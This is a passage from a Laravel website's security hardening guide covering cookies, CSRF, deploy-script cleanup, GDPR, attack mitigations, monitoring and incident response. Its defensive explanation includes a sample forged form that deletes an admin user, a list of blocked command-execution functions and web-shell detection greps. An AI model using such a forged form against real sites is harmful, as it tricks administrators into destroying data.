- If a user clicks a link to hilotec.com from an external site, no session cookie is sent on the initial navigation. The user appears logged out and must navigate to the site directly.
- This provides the strongest possible CSRF protection at the cookie level. An attacker's form on `evil.com` that POSTs to `hilotec.com/admin` will not include the session cookie.

**Trade-off:** `strict` mode means that links from emails or external sites will not carry the session. For a corporate website with minimal interactive features, this is the correct choice. If you add OAuth or third-party payment flows, you may need to change to `lax`.

### Session Lifetime

```php
'lifetime' => (int) env('SESSION_LIFETIME', 120),
'expire_on_close' => env('SESSION_EXPIRE_ON_CLOSE', false),
```

Sessions expire after 120 minutes (2 hours) of inactivity. Combined with the `AuthenticateSession` middleware on the admin panel, sessions are also invalidated when a password changes.

---

## 9. CSRF Protection

Laravel includes CSRF (Cross-Site Request Forgery) protection as a core middleware, applied automatically to all web routes.

### How It Works

1. Laravel generates a unique CSRF token per session and stores it in the session.
2. Every HTML form rendered by Blade must include the token via `@csrf`:
   ```html
   <form method="POST" action="/kontakt">
       @csrf
       <!-- form fields -->
   </form>
   ```
3. The `VerifyCsrfToken` middleware intercepts all POST, PUT, PATCH, and DELETE requests and verifies that the submitted `_token` field matches the session token.
4. If the token is missing or invalid, Laravel returns HTTP 419 (Page Expired).

### Why It Matters

Without CSRF protection, an attacker could create a page like:

```html
<form action="https://hilotec.com/admin/users/delete/1" method="POST">
    <input type="submit" value="Click here for a prize!">
</form>
```

If an admin visits this page while logged into the HILOTEC admin panel, the browser would send the session cookie with the POST request, and the user would be deleted. The CSRF token prevents this because the attacker's page cannot know the token value.

### AJAX/Livewire Requests

For Livewire and AJAX requests, the CSRF token is read from the `XSRF-TOKEN` cookie (which is NOT `HttpOnly` for this purpose) and sent as the `X-XSRF-TOKEN` header. The `.htaccess` includes a rule to pass this header through to PHP:

```apache
RewriteCond %{HTTP:x-xsrf-token} .
RewriteRule .* - [E=HTTP_X_XSRF_TOKEN:%{HTTP:X-XSRF-Token}]
```

### In This Project

The contact form (`/kontakt`) is the only public-facing POST endpoint:

```php
Route::post('/kontakt', [ContactController::class, 'send'])->name('contact.send');
```

All Filament admin forms automatically include CSRF tokens. The `VerifyCsrfToken` middleware is included in the admin panel middleware stack.

---

## 10. Deploy Script Security

> *This feature is only available on the `master` branch. See the warning at the top of this document.*
> The file `deploy.sh` does not exist on the `design-v2` branch.

**File:** `deploy.sh`

The deployment script addresses a specific threat: attackers who gain temporary write access to the server (e.g., via a vulnerability in another application on the same server) may drop malicious files into `public/`. The standard `git pull` command does not remove these files -- it only updates tracked files.

### Script Behavior

The script uses `set -euo pipefail`, which means:
- **-e** -- Exit immediately on any command failure.
- **-u** -- Treat unset variables as errors.
- **-o pipefail** -- A pipeline fails if any command in it fails.

This ensures the deployment stops immediately if anything goes wrong, rather than continuing with a partially deployed, possibly insecure state.

### Step 1: Fetch Latest Code

```bash
git fetch --depth=1 origin "$BRANCH"
git reset --hard "origin/$BRANCH"
```

Performs a shallow fetch and hard reset. This ensures the working directory exactly matches the repository, overwriting any local modifications (including modifications to `.htaccess` or `index.php`).

### Step 2: Clean Unauthorized Files

```bash
git clean -fd public/ --exclude=public/build --exclude=public/storage
```

Removes all untracked files from `public/`, except `public/build/` (generated assets) and `public/storage/` (uploaded files symlink). This is the core defense: any file an attacker dropped into `public/` is deleted.

```bash
find public/css/ public/js/ public/images/ public/fonts/ \
    -name '*.php' -o -name '*.phtml' -o -name '*.php5' \
    -type f -delete 2>/dev/null || true
```

Extra safety: explicitly removes PHP files from asset directories even if `git clean` missed them.

```bash
find public/ -mindepth 2 -name '.htaccess' -type f -delete 2>/dev/null || true
```

Removes `.htaccess` files injected into subdirectories. An attacker might place a `.htaccess` in `public/images/` to re-enable PHP execution in that directory.

### Step 3: Dependencies

```bash
$COMPOSER_BIN install --no-dev --no-interaction --prefer-dist --optimize-autoloader
```

`--no-dev` is critical: it excludes development dependencies (debug bars, test tools) that should never exist in production.

### Step 4: Frontend Build

Only runs `npm ci && npm run build` if `public/build` is in `.gitignore`. `npm ci` is used instead of `npm install` because it performs a clean install from `package-lock.json`, ensuring reproducible builds.

### Step 5: Laravel Optimizations

```bash
$PHP_BIN artisan config:cache
$PHP_BIN artisan route:cache
$PHP_BIN artisan view:cache
$PHP_BIN artisan migrate --force
$PHP_BIN artisan security:audit
```

Caches configuration, routes, and views for performance. Runs migrations. Runs the security audit to verify the deployed state is clean.

### Step 6: File Permissions

```bash
find public/ -type f -exec chmod 644 {} \;
find public/ -type d -exec chmod 755 {} \;
chmod -R 775 storage/ bootstrap/cache/
chmod 640 .env 2>/dev/null || true
```

- **public/ files: 644** (owner read/write, group read, others read). The web server can read but not modify files.
- **public/ directories: 755** (owner all, group read/execute, others read/execute).
- **storage/ and bootstrap/cache/: 775** (owner and group can write). These need to be writable by the web server for caching, logging, and file uploads.
- **.env: 640** (owner read/write, group read, no others). The `.env` file contains secrets and must not be world-readable.

---

## 11. GDPR Considerations

As a Swiss IT company, HILOTEC is subject to both the Swiss Federal Act on Data Protection (FADP/DSG) and, for EU clients, the GDPR.

### Google Fonts via CDN

The site loads fonts from `fonts.googleapis.com` and `fonts.gstatic.com`. When a visitor loads a page, their browser connects to Google's servers and transmits:

- The visitor's IP address.
- The browser's `User-Agent` string.
- The referring page URL.

In January 2022, a German court (LG Muenchen I, 3 O 17493/20) ruled that embedding Google Fonts via CDN without consent violates GDPR because it transfers personal data (the IP address) to Google (a US company) without a legal basis.

**Recommended action:** Self-host the fonts. Download the WOFF2 files from Google Fonts, place them in `public/fonts/`, update `resources/css/app.css` to use local `@font-face` declarations, and remove `fonts.googleapis.com` and `fonts.gstatic.com` from the CSP. This eliminates the data transfer entirely.

### Google Analytics / Tag Manager

The CSP currently allows Google Analytics and Tag Manager domains. If these services are active, they require:

- A cookie consent banner (opt-in for non-essential cookies).
- Disclosure in the privacy policy (Datenschutzerklaerung).
- IP anonymization enabled in Google Analytics.
- A data processing agreement (DPA) with Google.

If Google Analytics is not actually used, remove the Google domains from the CSP to reduce the attack surface.

### Contact Form Data

The contact form at `/kontakt` collects:
- Name
- Email address
- Phone number (optional)
- Message text

This data is stored in the `contact_submissions` database table. Under GDPR/DSG:

- **Legal basis:** Legitimate interest (responding to inquiries) or consent.
- **Data retention:** Define a retention period. Contact submissions should be deleted after the inquiry is resolved, or after a defined period (e.g., 12 months).
- **Right to deletion:** Implement a process for deleting contact submissions on request.
- **Privacy policy:** Disclose what data is collected, why, how long it is retained, and who to contact for data requests.

### Data Retention Recommendations

| Data Type | Recommended Retention | Implementation |
|-----------|----------------------|----------------|
| Contact submissions | 12 months | Scheduled artisan command to delete old entries |
| Session data | 120 minutes | Handled by session garbage collection |
| Access logs | 90 days | Logrotate configuration |
| Error logs | 90 days | Logrotate configuration |
| SecurityAudit quarantine | 90 days | Manual cleanup or scheduled task |

### Cookie Policy

The application sets these cookies:

| Cookie | Purpose | Essential? |
|--------|---------|-----------|
| Session cookie | Authentication, CSRF protection | Yes |
| `XSRF-TOKEN` | CSRF protection for AJAX | Yes |
| Google Analytics (if enabled) | Analytics tracking | No -- requires consent |

Essential cookies do not require consent under GDPR. Non-essential cookies (analytics, marketing) require opt-in consent before being set.

---

## 12. Common Attack Vectors and Mitigations

### SQL Injection

**Attack:** Injecting SQL code into form inputs or URL parameters to read, modify, or delete database data.

**How this project is protected:**
- **Eloquent ORM** -- All database queries use Eloquent or the query builder, which automatically uses parameterized queries. User input is never concatenated into SQL strings.
- **Input validation** -- The `ContactController` validates all input before passing it to Eloquent:
  ```php
  $validated = $request->validate([
      'name' => 'required|string|max:255',
      'email' => 'required|email|max:255',
      'phone' => 'nullable|string|max:255',
      'message' => 'required|string|max:5000',
  ]);
  ContactSubmission::create($validated);
  ```
- **Mass assignment protection** -- The `$fillable` property on models defines exactly which fields can be set via `create()` or `update()`, preventing attackers from setting unintended fields.

### Cross-Site Scripting (XSS)

**Attack:** Injecting JavaScript into pages that other users view, allowing session theft, defacement, or phishing.

**How this project is protected:**
- **Blade auto-escaping** -- All `{{ $variable }}` output is automatically HTML-escaped. The `<script>` tag becomes `&lt;script&gt;`.
- **Content Security Policy** -- Even if XSS bypasses Blade escaping, CSP restricts what scripts can execute and where they can connect.
- **HttpOnly session cookies** -- Even if JavaScript executes, `document.cookie` cannot access the session cookie.
- **X-Content-Type-Options: nosniff** -- Prevents browsers from interpreting uploaded files as HTML/JavaScript.

### Cross-Site Request Forgery (CSRF)

**Attack:** Tricking an authenticated admin into performing actions by submitting hidden forms from an attacker's site.

**How this project is protected:**
- **CSRF tokens** on all forms (see Section 9).
- **SameSite=Strict cookies** -- The session cookie is not sent with cross-origin requests, so the attacker's form submission will not be authenticated.
- **form-action 'self' CSP directive** -- Even if an attacker injects a form via XSS, it can only submit to the same origin.

### File Upload / Web Shell

**Attack:** Uploading a PHP file disguised as an image, then accessing it via HTTP to execute arbitrary commands.

**How this project is protected (five layers):**
1. **Web server blocks PHP in asset directories** (`.htaccess` and `nginx-security.conf`).
2. **Dangerous file extensions blocked** at the web server level.
3. **php-hardening.ini disables command execution functions** (`exec`, `system`, `shell_exec`, etc.).
4. **SecurityAudit command** scans for PHP files in asset directories every 6 hours and quarantines them.
5. **deploy.sh** removes PHP files from asset directories on every deployment.

### Brute Force (Admin Login)

**Attack:** Trying thousands of password combinations to guess admin credentials.

**How this project is protected:**
- **ThrottleAdminLogin** -- 5 attempts per minute per IP.
- **ThrottleRequests:60,1** -- 60 requests per minute overall for the admin panel.
- **Nginx rate limiting** (when enabled) -- 5 requests per minute on `/admin/login`.
- **bcrypt with 12 rounds** -- Each password hash takes approximately 250ms to compute, making brute force computationally expensive.
- **ADMIN_EMAILS whitelist** -- Even with correct credentials, access requires the email to be whitelisted.

### Path Traversal

**Attack:** Using `../` sequences to access files outside the intended directory (e.g., `../../.env`).

**How this project is protected:**
- **Hidden files blocked** at the web server level (`.htaccess` and Nginx rules).
- **Sensitive file types blocked** (`.env`, `.sql`, `.log`, `.ini`, etc.).
- **open_basedir** (when configured in `php-hardening.ini`) restricts PHP's filesystem access to the project directory and `/tmp`.
- **Laravel's routing** -- Only `index.php` is the entry point; all other requests go through the front controller, which does not serve arbitrary files.

### Clickjacking

**Attack:** Embedding the site in an invisible iframe on an attacker's page to trick users into clicking buttons (e.g., admin delete actions).

**How this project is protected:**
- **X-Frame-Options: SAMEORIGIN** -- Browsers refuse to display the site in a frame on another domain.
- **CSP frame-ancestors 'self'** -- Same protection via CSP (for browsers that support it).
- **Cross-Origin-Opener-Policy: same-origin** -- Prevents other windows from interacting with this one.

### Slowloris / DoS

**Attack:** Opening many slow connections to exhaust server resources.

**How this project is protected:**
- **Nginx timeouts** -- `client_body_timeout`, `client_header_timeout`, and `send_timeout` all set to 10 seconds.
- **Connection limits** (when enabled) -- `limit_conn conn_limit 20` limits each IP to 20 concurrent connections.
- **PHP max_execution_time = 30** -- Kills long-running scripts.

---

## 13. Security Monitoring

### What to Watch For

#### Log Files to Monitor

| Log | Location | What to Look For |
|-----|----------|------------------|
| Laravel application log | `storage/logs/laravel.log` | Authentication failures, 500 errors, unexpected exceptions |
| Nginx access log | `/var/log/nginx/access.log` | Unusual request patterns, 403/404 spikes, requests from unexpected countries |
| Nginx error log | `/var/log/nginx/error.log` | PHP-FPM failures, upstream timeouts |
| Blocked PHP execution | `/var/log/nginx/blocked-php-execution.log` | Any entries here indicate an attempted web shell attack |
| Blocked suspicious files | `/var/log/nginx/blocked-suspicious-files.log` | Indicates vulnerability scanning or exploitation attempts |
| PHP-FPM error log | `/var/log/php8.x-fpm.log` | Fatal errors, memory limit exceeded, execution timeouts |
| Fail2Ban log | `/var/log/fail2ban.log` | Banned IPs, jail triggers |
| Auth log | `/var/log/auth.log` | SSH attempts, sudo usage |

#### Indicators of Compromise

- **SecurityAudit findings:** Any alert from the security audit command indicates potential compromise. Treat as high priority.
- **New files in public/:** Files not tracked by git appearing in `public/` (especially `.php`, `.phtml`).
- **.htaccess modifications:** The SecurityAudit detects this by comparing git hashes.
- **Unexpected admin logins:** Review the sessions table for active admin sessions. Correlate with known admin activity.
- **Outbound connections:** Monitor for unexpected outbound connections from the web server (could indicate a reverse shell or data exfiltration).
- **Cron job changes:** Periodically verify `crontab -l` has not been modified.
- **File permission changes:** World-writable files in `public/` or unexpected SUID bits.

### Setting Up Monitoring

1. **Security audit alerts** are already configured via `Schedule::command('security:audit --fix --notify')->everySixHours()`. Ensure `MAIL_TO` is set in `.env`.

2. **Fail2Ban** should be configured for SSH and optionally for Nginx:
   ```bash
   sudo apt install fail2ban
   ```
   The default SSH jail bans IPs after failed login attempts. Add Nginx jails for additional protection.

3. **Log rotation** should be configured to prevent logs from filling the disk:
   ```bash
   # /etc/logrotate.d/laravel
   /home/forge/yoursite.com/storage/logs/*.log {
       daily
       missingok
       rotate 90
       compress
       notifempty
   }
   ```

4. **Uptime monitoring** (e.g., UptimeRobot, BetterUptime) should check both the public site and the `/up` health endpoint.

---

## 14. Security Update Procedures

### PHP Dependencies (Composer)

```bash
# Check for known vulnerabilities in installed packages
composer audit

# Check for available updates
composer outdated

# Update dependencies (test in staging first)
composer update
```

Run `composer audit` at least monthly. Critical vulnerabilities should be patched immediately.

### JavaScript Dependencies (npm)

```bash
# Check for known vulnerabilities
npm audit

# Auto-fix where possible (minor/patch updates only)
npm audit fix

# Check for available updates
npm outdated

# Update dependencies
npm update
```

Since frontend assets are compiled and the built JavaScript runs in the browser (not on the server), npm vulnerabilities are generally lower priority than Composer vulnerabilities. However, a compromised build-time dependency could inject malicious code into the compiled assets.

### Laravel Framework Updates

Follow the official Laravel upgrade guide for major version updates. For minor/patch updates:

```bash
composer update laravel/framework
```

Subscribe to the Laravel security mailing list and watch the [Laravel security advisories](https://github.com/laravel/framework/security/advisories).

### PHP Runtime Updates

```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade php8.x-*
sudo systemctl restart php8.x-fpm
```

PHP publishes security releases regularly. Subscribe to php.net announcements.

### Operating System Updates

```bash
# Enable automatic security updates
sudo apt install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

### CVE Monitoring

Subscribe to security advisories for all components in the stack:

| Component | Advisory Source |
|-----------|----------------|
| Laravel | github.com/laravel/framework/security/advisories |
| Filament | github.com/filamentphp/filament/security/advisories |
| PHP | php.net/releases |
| Nginx | nginx.org/en/security_advisories.html |
| Ubuntu/Debian | ubuntu.com/security/notices |
| SQLite | sqlite.org/cves.html |

### Update Workflow

1. Run `composer audit` and `npm audit`.
2. Apply updates in a local development environment.
3. Run the full test suite.
4. Deploy to staging and verify functionality.
5. Deploy to production using `deploy.sh`.
6. Run `php artisan security:audit` after deployment.

---

## 15. Incident Response Checklist

If you suspect the server has been compromised, follow these steps in order.

### Phase 1: Contain (Immediately)

- [ ] **Take the site offline.** Put Laravel into maintenance mode:
  ```bash
  php artisan down --secret="your-secret-token"
  ```
  The `--secret` flag allows you to access the site at `https://yoursite.com/your-secret-token` for investigation while the public sees a maintenance page.

- [ ] **Block the attacker's IP** (if known) at the firewall level:
  ```bash
  sudo ufw deny from ATTACKER_IP
  ```

- [ ] **Preserve evidence.** Do NOT delete suspicious files yet. Copy them to an investigation directory:
  ```bash
  mkdir -p /tmp/incident-$(date +%Y%m%d)
  cp -a public/ /tmp/incident-$(date +%Y%m%d)/public-snapshot
  cp storage/logs/laravel.log /tmp/incident-$(date +%Y%m%d)/
  ```

- [ ] **Rotate credentials immediately:**
  - Change the `APP_KEY` in `.env` (this invalidates all sessions and encrypted data).
  - Change all admin passwords.
  - Change database credentials.
  - Rotate any API keys in `.env`.
  - Change SSH keys if SSH access is suspected.

### Phase 2: Investigate

- [ ] **Run the security audit:**
  ```bash
  php artisan security:audit
  ```

- [ ] **Check for unauthorized files:**
  ```bash
  # Files not tracked by git
  git status
  git diff

  # Recently modified files
  find public/ -mtime -7 -type f

  # PHP files in asset directories
  find public/css/ public/js/ public/images/ public/fonts/ -name '*.php'
  ```

- [ ] **Check for modified core files:**
  ```bash
  git diff HEAD
  ```

- [ ] **Review access logs** for the attack vector:
  ```bash
  # Look for POST requests to unusual paths
  grep "POST" /var/log/nginx/access.log | grep -v "/kontakt\|/admin/login\|/livewire"

  # Look for 200 responses to PHP files in asset directories
  grep "\.php" /var/log/nginx/access.log | grep " 200 "
  ```

- [ ] **Check for cron job modifications:**
  ```bash
  crontab -l
  sudo crontab -l
  ls -la /etc/cron.d/
  ```

- [ ] **Check for unauthorized SSH keys:**
  ```bash
  cat ~/.ssh/authorized_keys
  ```

- [ ] **Check for unauthorized system users:**
  ```bash
  grep -v nologin /etc/passwd
  ```

- [ ] **Check running processes:**
  ```bash
  ps aux | grep -v "^\[" | sort -k3 -r | head -20
  ```

### Phase 3: Eradicate

- [ ] **Redeploy from a known-good state:**
  ```bash
  # This is the safest approach -- reset everything to the git repository
  git fetch origin master
  git reset --hard origin/master
  git clean -fd
  bash deploy.sh
  ```

- [ ] **Verify the deployment is clean:**
  ```bash
  php artisan security:audit
  ```

- [ ] **If the attack vector was a vulnerability in a dependency, update it:**
  ```bash
  composer audit
  composer update
  ```

### Phase 4: Recover

- [ ] **Bring the site back online:**
  ```bash
  php artisan up
  ```

- [ ] **Monitor closely** for the next 48 hours. Watch:
  - Access logs for the attacker's IP or similar patterns.
  - Security audit results.
  - Server resource usage.

- [ ] **Notify affected parties** if any personal data was compromised (GDPR/DSG requirement). You have 72 hours to notify the data protection authority.

### Phase 5: Learn

- [ ] **Document the incident:** What happened, when, how it was detected, what the impact was, and how it was resolved.
- [ ] **Identify the root cause:** How did the attacker gain access? Was it a software vulnerability, weak credentials, social engineering, or a misconfiguration?
- [ ] **Implement preventive measures:** Patch the vulnerability, tighten configurations, add monitoring for the specific attack vector.
- [ ] **Review this document:** Update any sections that are incomplete or inaccurate based on the incident.

---

## Appendix: Quick Reference

### Production .env Security Settings

```env
APP_ENV=production
APP_DEBUG=false
APP_URL=https://yourdomain.com

SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_ENCRYPT=true
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict

LOG_CHANNEL=stack
LOG_LEVEL=error

ADMIN_EMAILS=admin@yourdomain.com
MAIL_TO=admin@yourdomain.com

BCRYPT_ROUNDS=12
```

### Security Verification Commands

```bash
# Run the file integrity scanner
php artisan security:audit

# Check PHP dependencies for known vulnerabilities
composer audit

# Check JS dependencies for known vulnerabilities
npm audit

# Verify Laravel configuration caching
php artisan config:show session
```

### External Verification Services

| Service | URL | Target Rating |
|---------|-----|---------------|
| SSL Labs | ssllabs.com/ssltest | A+ |
| Security Headers | securityheaders.com | A+ |
| Mozilla Observatory | observatory.mozilla.org | A+ |
| HSTS Preload | hstspreload.org | Eligible |
